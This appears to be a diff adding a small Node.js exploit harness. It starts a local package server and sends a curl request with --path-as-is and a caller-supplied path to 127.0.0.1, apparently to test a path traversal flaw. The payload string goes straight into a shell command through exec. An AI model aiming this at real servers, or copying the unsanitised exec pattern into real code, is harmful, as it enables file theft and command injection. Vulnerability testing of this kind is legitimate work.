@@ -1,0 +1,23 @@
+const { exec, execSync } = require("child_process"); // Import necessary modules
+const sleep = require("sleep");
+
+function exploitFunction(payload) {
+  const { genstr } = payload;
+
+  // Simulate starting the server (this part is simplified)
+  let server = "node ./node_modules/nodeaaaaa/index.js";
+  let exe = exec(server, (error, stdout) => {});
+
+  sleep.sleep(2);
+
+  // Craft the attack string using the payload
+  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr()}"`;
+
+  // Execute the attack string
+  exec(attack_string, (error, stdout) => {
+    if (error) throw error;
+    return stdout;
+  });
+}
+
+module.exports = { exploitFunction };
